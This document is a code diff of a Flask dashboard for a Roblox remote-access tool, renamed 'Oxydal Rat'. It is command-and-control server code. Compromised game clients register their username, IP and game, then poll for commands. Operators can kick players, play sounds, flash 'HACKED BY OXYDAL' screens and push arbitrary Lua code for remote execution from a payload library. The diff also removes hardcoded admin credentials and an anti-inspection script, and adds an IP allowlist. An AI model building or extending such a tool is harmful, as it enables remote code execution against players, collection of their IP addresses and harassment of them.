@@ -1,37 +1,18 @@
-from flask import Flask, request, render_template_string, session, redirect, url_for, make_response, jsonify
+from flask import Flask, request, jsonify, render_template_string, abort
 from flask_socketio import SocketIO
 import time
 import eventlet
-from datetime import datetime, timedelta
+from datetime import datetime
 import json
 import os
-import requests
 
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "WAVERAT_ANTI_INSPECT_FINAL_2025_XAI"
-app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)
+app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ====================== IDENTIFIANTS ======================
-ADMIN_USERNAME = "WaveRatAdmin2025"
-ADMIN_PASSWORD = "R4tW@v3!2k25#xAI"
-
-# ====================== ANTI PROXY / VPN / TOR ======================
-def is_proxy_or_vpn(ip):
-    if ip in ["127.0.0.1", "::1"]: return False
-    try:
-        r = requests.get(f"http://v2.api.iphub.info/ip/{ip}", timeout=6)
-        if r.status_code == 200 and r.json().get("block") == 1: return True
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,tor", timeout=6)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get("proxy") or data.get("hosting") or data.get("tor"): return True
-    except: pass
-    return False
-
-# ====================== FICHIERS ======================
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
 
@@ -66,7 +47,25 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# ====================== HISTORIQUE ======================
+def check_ip():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    if ip not in ALLOWED_IPS:
+        abort(403)
+
+@app.errorhandler(403)
+def access_denied(e):
+    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if detected and "," in detected:
+        detected = detected.split(",")[0].strip()
+    return f"<html><body style='background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403
+
+@app.before_request
+def protect_routes():
+    if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
+        check_ip()
+
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
@@ -77,138 +76,24 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE LOGIN + RECAPTCHA + ANTI-INSPECT ======================
-LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en" class="dark">
-<head>
-<meta charset="UTF-8">
-<title>Wave Rat - Login</title>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
-<style>
-    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;--text-muted:#94a3b8;}
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
-    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,.7);}
-    .logo{text-align:center;margin-bottom:2rem;}
-    .logo svg{width:80px;height:80px;fill:var(--primary);}
-    h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1.5rem;color:var(--primary);}
-    input[type="text"], input[type="password"]{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;font-size:1rem;}
-    .btn{width:100%;padding:14px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem;}
-    .btn:hover{background:#0891b2;transform:translateY(-3px);}
-    .g-recaptcha{margin:20px auto;}
-    .remember{display:flex;align-items:center;gap:10px;margin:15px 0;color:var(--text-muted);font-size:0.95rem;}
-    .remember input{width:18px;height:18px;cursor:pointer;}
-    .remember label{cursor:pointer;}
-</style>
-</head>
-<body>
-<div class="login-card">
-    <div class="logo">
-        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
-    </div>
-    <h1>Wave Rat Dashboard</h1>
-    <form method="POST" action="/login">
-        <input type="text" name="username" placeholder="Username" required autofocus>
-        <input type="password" name="password" placeholder="Password" required>
-
-        <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
-
-        <div class="remember">
-            <input type="checkbox" name="remember" id="remember">
-            <label for="remember">Remember Me</label>
-        </div>
-
-        <button type="submit" class="btn">Login Securely</button>
-    </form>
-</div>
-
-<!-- ANTI-INSPECT / F12 / CTRL+SHIFT+I / RIGHT CLICK -->
-<script>
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
-            document.body.innerHTML = "<h1 style='color:#ef4444;text-align:center;margin-top:40%'>Accès interdit.</h1>";
-            setTimeout(() => { window.location.href = "about:blank"; }, 1000);
-            return false;
-        }
-    };
-    document.addEventListener("contextmenu", e => e.preventDefault());
-    document.addEventListener("selectstart", e => e.preventDefault());
-    document.addEventListener("dragstart", e => e.preventDefault());
-
-    setInterval(() => {
-        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
-            document.body.innerHTML = "<h1 style='color:#ef4444;text-align:center;margin-top:40%'>DevTools détecté → Fermeture.</h1>";
-            setTimeout(() => { window.location.href = "about:blank"; }, 800);
-        }
-    }, 500);
-</script>
-</body>
-</html>"""
-
-# ====================== LOGIN + RECAPTCHA + REMEMBER ME + VRAI LOGOUT ======================
-@app.route("/login", methods=["GET", "POST"])
-def login():
-    if session.get("logged_in"):
-        return redirect("/")
-
-    if request.method == "GET":
-        return render_template_string(LOGIN_HTML)
-
-    username = request.form.get("username", "")
-    password = request.form.get("password", "")
-    remember = request.form.get("remember") == "on"
-    recaptcha_response = request.form.get("g-recaptcha-response")
-
-    if not recaptcha_response:
-        return render_template_string(LOGIN_HTML + "<script>alert('reCAPTCHA requis !');location.reload();</script>")
-
-    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
-        session["logged_in"] = True
-        session.permanent = remember
-        return redirect("/")
-    else:
-        return render_template_string(LOGIN_HTML + "<script>alert('Mauvais identifiants !');location.reload();</script>")
-
-@app.route("/logout")
-def logout():
-    session.clear()
-    resp = make_response(redirect("/login"))
-    resp.set_cookie('session', '', expires=0)
-    return resp
-
-# ====================== PROTECTION + ANTI-VPN ======================
-@app.before_request
-def security_check():
-    protected = ["/", "/kick", "/troll", "/payload", "/get_history"]
-    if request.path in protected or request.path.startswith("/api"):
-        if not session.get("logged_in"):
-            return redirect("/login")
-
-    if request.path == "/login":
-        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-        if ip and "," in ip: ip = ip.split(",")[0].strip()
-        if is_proxy_or_vpn(ip):
-            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy détecté → Accès refusé</h1>", 403
-
-# ====================== DASHBOARD COMPLET ======================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
-<title>Wave Rat Dashboard</title>
+<title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&family=Orbitron:wght@700&family=Press+Start+2P&family=Creepster&family=Bangers&family=Nosifer&family=Monoton&family=Audiowide&family=Wallpoet&family=VT323&family=Share+Tech+Mono&family=Exo+2:wght@700&family=Rajdhani:wght@600&family=Anton&family=Bebas+Neue&family=Righteous&family=Russo+One&family=Staatliches&family=Teko:wght@600&family=Fredoka+One&family=Pacifico&family=Lobster&family=Dancing+Script:wght@700&family=Caveat&display=swap" rel="stylesheet">
 <style>
     :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;}
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
     .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
     .logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
     .logo svg{width:40px;height:40px;fill:var(--primary);}
     .stats{font-size:1.1rem;color:var(--text-muted);}
     .stats b{color:var(--primary);font-weight:600;}
-    .main{flex:1;margin-top:70px;display:flex;position:relative;}
+    .main{flex:1;margin-top:70px;display:flex;}
     .sidebar{width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0;}
     .nav-item{padding:1rem 2rem;cursor:pointer;transition:all .3s;color:var(--text-muted);font-weight:500;}
     .nav-item:hover{background:rgba(6,182,212,.15);color:var(--primary);}
@@ -230,7 +115,8 @@ HTML = """<!DOCTYPE html>
     .info{font-size:.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px;}
     .category{font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:.95rem;}
     .btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
-    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
+    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;
+         background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
     .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
     .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
     .btn.undo{background:#475569;}
@@ -243,6 +129,7 @@ HTML = """<!DOCTYPE html>
     .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
     .payload-item:hover{background:#334155;}
     .payload-item.selected{background:var(--primary);color:black;}
+    .font-preview{font-family:var(--preview-font,'Inter');font-size:60px;color:var(--preview-color,#06b6d4);margin:10px 0;padding:10px;background:#0f172a;border-radius:8px;text-align:center;}
     .modal-buttons{display:flex;gap:1rem;}
     .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all .3s;}
     .confirm{background:var(--primary);color:white;}
@@ -251,16 +138,18 @@ HTML = """<!DOCTYPE html>
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
     .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
     @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
-    .logout-fixed{position:fixed;bottom:30px;left:30px;z-index:999;}
-    .logout-btn{padding:14px 28px;background:#ef4444;color:white;border:none;border-radius:12px;cursor:pointer;font-weight:600;font-size:1rem;box-shadow:0 10px 30px rgba(239,68,68,.4);}
-    .logout-btn:hover{background:#dc2626;transform:translateY(-4px);}
+    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
+    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
+    .payload-item:hover{background:#334155;}
+    .payload-item.selected{background:var(--primary);color:black;}
 </style>
 </head>
 <body>
+
 <div class="header">
     <div class="logo">
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
-        <div>Wave Rat Dashboard</div>
+        <div>Oxydal Rat</div>
     </div>
     <div class="stats">Players online: <b id="stats">0</b></div>
 </div>
@@ -271,6 +160,7 @@ HTML = """<!DOCTYPE html>
         <div class="nav-item" data-tab="workshop">Workshop</div>
         <div class="nav-item" data-tab="history">History</div>
     </div>
+
     <div class="content">
         <div id="players-tab" class="tab active">
             <div class="search-bar"><input type="text" id="searchInput" placeholder="Search by username, ID, IP, Game, JobId..." onkeyup="filterPlayers()"></div>
@@ -284,13 +174,50 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- TOUS LES MODALS -->
+<!-- Modals -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
+
+<!-- Text Screen avec police, couleur, taille -->
+<div class="modal" id="textScreenModal"><div class="modal-content">
+    <h2>Display Text Screen</h2>
+    <input type="text" id="screenText" placeholder="Enter text" value="HACKED BY OXYDAL">
+    <label style="color:#94a3b8;font-size:0.9rem;">Font</label>
+    <select id="textFont">
+        <option value="Arial">Arial</option>
+        <option value="Orbitron">Orbitron (Futuristic)</option>
+        <option value="Press Start 2P">Press Start 2P (8-bit)</option>
+        <option value="Creepster">Creepster (Horror)</option>
+        <option value="Bangers">Bangers (Comic)</option>
+        <option value="Nosifer">Nosifer (Blood)</option>
+        <option value="Monoton">Monoton (Neon)</option>
+        <option value="Audiowide">Audiowide</option>
+        <option value="VT323">VT323 (Terminal)</option>
+        <option value="Bebas Neue">Bebas Neue</option>
+        <option value="Righteous">Righteous</option>
+        <option value="Russo One">Russo One</option>
+        <option value="Pacifico">Pacifico</option>
+        <option value="Lobster">Lobster</option>
+        <option value="Dancing Script">Dancing Script</option>
+    </select>
+    <label style="color:#94a3b8;font-size:0.9rem;">Color</label>
+    <input type="color" id="textColor" value="#06b6d4">
+    <label style="color:#94a3b8;font-size:0.9rem;">Size (10-200)</label>
+    <input type="range" id="textSize" min="10" max="200" value="80">
+    <div class="font-preview" id="fontPreview">Preview Text</div>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Cancel</button>
+        <button class="modal-btn confirm" id="confirmText">Display Text</button>
+    </div>
+</div></div>
+
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
+
+<!-- Modal Import Payload avec recherche + édition -->
+<!-- Import Payload avec recherche + édition -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Import & Edit Payload</h2>
     <div class="search-bar"><input type="text" id="payloadSearch" placeholder="Search payload by name..." onkeyup="filterPayloads()"></div>
@@ -301,12 +228,8 @@ HTML = """<!DOCTYPE html>
         <button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button>
     </div>
 </div></div>
-<div class="toast-container" id="toasts"></div>
 
-<!-- LOGOUT EN BAS À GAUCHE -->
-<div class="logout-fixed">
-    <button class="logout-btn" onclick="location.href='/logout'">Logout</button>
-</div>
+<div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
@@ -314,6 +237,7 @@ let currentKickId = null, currentSoundId = null, currentTextId = null, currentLu
 let editingPayload = null;
 let selectedPayloadName = null;
 
+// Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
     item.addEventListener('click', () => {
         document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -330,6 +254,7 @@ function toast(msg) {
     setTimeout(() => t.remove(), 4000);
 }
 
+// Recherche joueurs
 function filterPlayers() {
     const query = document.getElementById("searchInput").value.toLowerCase();
     document.querySelectorAll('.card').forEach(card => {
@@ -338,6 +263,24 @@ function filterPlayers() {
     });
 }
 
+// Text Screen Preview
+function updatePreview() {
+    const text = document.getElementById("screenText").value || "Preview Text";
+    const font = document.getElementById("textFont").value;
+    const color = document.getElementById("textColor").value;
+    const size = document.getElementById("textSize").value;
+    const preview = document.getElementById("fontPreview");
+    preview.textContent = text;
+    preview.style.fontFamily = font;
+    preview.style.color = color;
+    preview.style.fontSize = size + "px";
+}
+document.getElementById("screenText").addEventListener("input", updatePreview);
+document.getElementById("textFont").addEventListener("change", updatePreview);
+document.getElementById("textColor").addEventListener("input", updatePreview);
+document.getElementById("textSize").addEventListener("input", updatePreview);
+
+// Workshop
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
@@ -391,6 +334,7 @@ document.getElementById("savePayload").addEventListener("click", () => {
     });
 });
 
+// Import Payload avec recherche + édition
 window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
@@ -435,9 +379,19 @@ document.getElementById("executeTempPayload").addEventListener("click", () => {
     document.getElementById("executePayloadModal").classList.remove("active");
 });
 
+// Fonctions classiques
 function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
 function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
 function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
+function openTextScreenModal(id){
+    currentTextId=id;
+    document.getElementById("screenText").value="HACKED BY OXYDAL";
+    document.getElementById("textFont").value="Creepster";
+    document.getElementById("textColor").value="#ff0000";
+    document.getElementById("textSize").value=100;
+    updatePreview();
+    document.getElementById("textScreenModal").classList.add("active");
+}
 function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
 function openImportFileModal(id){currentImportId=id;document.getElementById("importFileModal").classList.add("active");}
 
@@ -445,11 +399,7 @@ document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("cli
 
 function sendTroll(id,cmd,param=null){
     const body={userid:id,cmd};
-    if(param){
-        if(cmd==="playsound") body.assetId=param;
-        else if(cmd==="textscreen") body.text=param;
-        else if(cmd==="luaexec") body.script=param;
-    }
+    if(param){if(cmd==="playsound")body.assetId=param;else if(cmd==="textscreen")body.text=param;else if(cmd==="luaexec")body.script=param;}
     fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
     toast(cmd.toUpperCase()+" sent");
 }
@@ -457,6 +407,7 @@ function sendTroll(id,cmd,param=null){
 document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
 document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
 document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);document.getElementById("textScreenModal").classList.remove("active");});
+document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(!t)return toast("Enter text");const payload={text:t,font:document.getElementById("textFont").value,color:document.getElementById("textColor").value,size:parseInt(document.getElementById("textSize").value)};sendTroll(currentTextId,"textscreen",JSON.stringify(payload));document.getElementById("textScreenModal").classList.remove("active");});
 document.getElementById("confirmLua").addEventListener("click",()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);document.getElementById("luaExecModal").classList.remove("active");});
 document.getElementById("confirmImport").addEventListener("click",()=>{
     const f=document.getElementById("luaFileInput").files[0];
@@ -477,6 +428,7 @@ function render(data){
             <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
             <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId || "N/A"}</div>
+
             <div class="category">TROLLS</div>
             <div class="btn-grid">
                 <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
@@ -489,6 +441,7 @@ function render(data){
                 <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                 <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
             </div>
+
             <div class="category">UNDO</div>
             <div class="btn-grid">
                 <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
@@ -498,6 +451,7 @@ function render(data){
                 <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                 <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
             </div>
+
             <div class="category">LUA EXEC</div>
             <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                 <button class="btn" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
@@ -521,6 +475,7 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
+# === Routes (inchangées) ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -535,42 +490,26 @@ def api():
     if request.method == "POST":
         try:
             d = request.get_json(silent=True) or {}
-            print(f"Requête POST reçue: {d}")  # Log pour débogage
-            uid = str(d.get("userid", ""))
-            if not uid:
-                print("Erreur: Aucun userid fourni")
-                return jsonify({"error": "Missing userid"}), 400
+            uid = str(d["userid"])
             if d.get("action") == "register":
                 username = d.get("username", "Unknown")
                 connected_players[uid] = {
-                    "username": username,
-                    "executor": d.get("executor", "Unknown"),
-                    "ip": d.get("ip", "Unknown"),
-                    "last": now,
-                    "online": True,
-                    "game": d.get("game", "Unknown"),
-                    "gameId": d.get("gameId", 0),
+                    "username": username, "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
+                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
                     "jobId": d.get("jobId", "Unknown")
                 }
-                print(f"Joueur enregistré: {username} (ID: {uid})")  # Log
                 add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
             elif d.get("action") == "heartbeat" and uid in connected_players:
                 connected_players[uid]["last"] = now
-                print(f"Heartbeat reçu pour: {uid}")  # Log
-            return jsonify({"ok": True})
-        except Exception as e:
-            print(f"Erreur dans POST /api: {str(e)}")  # Log
-            return jsonify({"error": str(e)}), 500
+        except: pass
+        return jsonify({"ok": True})
 
     if request.method == "GET":
         uid = str(request.args.get("userid", ""))
-        print(f"Requête GET reçue pour userid: {uid}")  # Log
-        if not uid:
-            print("Erreur: Aucun userid fourni pour GET")
-            return jsonify({}), 400
+        if not uid: return jsonify({})
         if uid in pending_kicks:
             reason = pending_kicks.pop(uid, "Kicked")
-            print(f"Envoi commande kick pour {uid}: {reason}")  # Log
             return jsonify({"command": "kick", "reason": reason})
         if uid in pending_commands:
             cmd = pending_commands.pop(uid)
@@ -579,24 +518,24 @@ def api():
                 if "assetId" in cmd: result["assetId"] = cmd["assetId"]
                 if "text" in cmd: result["text"] = cmd["text"]
                 if "script" in cmd: result["script"] = cmd["script"]
-            print(f"Envoi commande pour {uid}: {result}")  # Log
             return jsonify(result)
         return jsonify({})
 
 @app.route("/kick", methods=["POST"])
 def kick():
+    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     reason = data.get("reason", "No reason")
     pending_kicks[uid] = reason
     name = connected_players.get(uid, {}).get("username", "Unknown")
-    print(f"Kick envoyé pour {name} (ID: {uid}): {reason}")  # Log
     add_history("action", name, f"KICKED: {reason}")
     socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
     return jsonify({"sent": True})
 
 @app.route("/troll", methods=["POST"])
 def troll():
+    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     cmd = data.get("cmd", "")
@@ -614,36 +553,30 @@ def troll():
             details += f" (Script: {len(data['script'])} chars)"
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
-        print(f"Troll envoyé pour {name} (ID: {uid}): {details}")  # Log
         add_history("action", name, details)
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
 @app.route("/payload", methods=["GET", "POST"])
 def payload_manager():
+    check_ip()
     if request.method == "GET":
         action = request.args.get("action")
-        if action == "list":
-            print("Liste des payloads demandée")  # Log
-            return jsonify(payloads)
+        if action == "list": return jsonify(payloads)
         if action == "get":
             name = request.args.get("name")
-            print(f"Payload demandé: {name}")  # Log
             return jsonify({"code": payloads.get(name, "")})
     else:
         data = request.get_json() or {}
         action = data.get("action")
         if action == "create":
             payloads[data["name"]] = data["code"]
-            print(f"Payload créé: {data['name']}")  # Log
         elif action == "update":
             if data.get("oldname") in payloads:
                 del payloads[data["oldname"]]
             payloads[data["name"]] = data["code"]
-            print(f"Payload mis à jour: {data['name']}")  # Log
         elif action == "delete":
             payloads.pop(data.get("name"), None)
-            print(f"Payload supprimé: {data.get('name')}")  # Log
         save_payloads()
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
@@ -664,15 +597,10 @@ def broadcast_loop():
                 if p["online"]: online += 1
         for uid in to_remove:
             username = connected_players.pop(uid, {}).get("username", "Unknown")
-            print(f"Joueur déconnecté: {username} (ID: {uid})")  # Log
             add_history("disconnect", username, "Disconnected")
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
 
 if __name__ == "__main__":
-    print("Wave Rat Dashboard FINAL lancé")
-    print("Username: WaveRatAdmin2025")
-    print("Password: R4tW@v3!2k25#xAI")
-    print("reCAPTCHA + Remember Me + Anti-F12 + Logout en bas à gauche + VRAI logout")
     socketio.start_background_task(broadcast_loop)
-    socketio.run(app, host="0.0.0.0", port=5000, debug=True)  # Debug activé pour logs
+    socketio.run(app, host="0.0.0.0", port=5000)
